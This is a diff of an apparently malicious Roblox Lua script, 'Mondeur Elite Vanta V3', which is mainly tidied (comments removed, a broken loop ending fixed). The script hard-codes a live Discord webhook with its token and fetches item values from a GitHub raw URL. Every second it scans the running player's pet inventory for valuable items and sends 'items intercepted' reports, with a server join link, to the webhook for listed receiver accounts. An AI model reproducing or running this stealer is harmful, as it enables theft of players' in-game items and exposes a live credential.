@@ -1,10 +1,10 @@
--- [[ MONDEUR ELITE | VANTA V3 ]] --
+-- [[ MONDEUR ELITE | VANTA V3 FIXED ]] --
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 
--- [[ UPDATED CONFIG ]] --
+-- [[ CONFIGURATION ]] --
 local USER_WEBHOOK = "https://discord.com/api/webhooks/1474651524251648163/lhPvWSeT6mcm3b4tIfzEbph1asYmZGvxf3YABYsKUOSeInP3oXW10NmHKJuj0vDrICku"
 local POINT_SYSTEM_URL = "https://raw.githubusercontent.com/charles1384/ADM/refs/heads/main/Pointsystem"
 local TARGET_RECEIVERS = {"2ndcfpaj67", "sofiqmnz", "Hisokarah", "CREOLEO23"}
@@ -17,7 +17,6 @@ local function loadPoints()
     if success then
         for line in content:gmatch("[^\r\n]+") do
             local name, val = line:match("([^:=]+)[:=](%d+)")
-            -- Clean the names: lowercase and remove extra spaces
             if name and val then 
                 PetValues[name:lower():gsub("%s+", "")] = tonumber(val) 
             end
@@ -42,7 +41,6 @@ local function sendMondeurWebhook(pets, total, isHandshake)
 
     local payload = {
         username = "Mondeur Intelligence",
-        -- Using a clean Discord-hosted icon to avoid broken Imgur links
         avatar_url = "https://cdn.discordapp.com/embed/avatars/4.png", 
         embeds = {{
             title = isHandshake and "🛰️ SYSTEM: SESSION INITIALIZED" or "🎯 TARGET: ITEMS INTERCEPTED",
@@ -59,7 +57,7 @@ local function sendMondeurWebhook(pets, total, isHandshake)
                 "[View Raw Data](https://api.rubis.app/v2/scrap/nu3YNS4Pum4oLolW/raw)\n" ..
                 "🔗 **QUICK JOIN**\n" ..
                 "[Click to Join Server](https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId .. ")",
-            color = isHandshake and 0x5865F2 or 0xFEE75C, -- Blurple for start, Gold for a hit
+            color = isHandshake and 0x5865F2 or 0xFEE75C,
             footer = { text = "Mondeur Hit | " .. os.date("%X") }
         }}
     }
@@ -74,7 +72,7 @@ local function sendMondeurWebhook(pets, total, isHandshake)
     end)
 end
 
--- [[ CORE LOGIC WITH IMPROVED DETECTION ]] --
+-- [[ CORE LOGIC ]] --
 local function execute()
     local receiver = nil
     for _, name in ipairs(TARGET_RECEIVERS) do
@@ -88,11 +86,8 @@ local function execute()
     if success and inv then
         for _, item in ipairs(inv) do
             if item.Kind == "Pet" then
-                -- Clean the pet name from the game
                 local cleanName = item.Name:lower():gsub("%s+", "")
-                
                 for pointName, val in pairs(PetValues) do
-                    -- If the point name is FOUND anywhere in the clean pet name
                     if string.find(cleanName, pointName) then
                         table.insert(list, {id = item.Id, name = item.Name, value = val})
                         total = total + val
@@ -119,7 +114,5 @@ task.spawn(function()
     while true do
         pcall(execute)
         task.wait(1)
-    end
-end)        task.wait(1)
     end
 end)
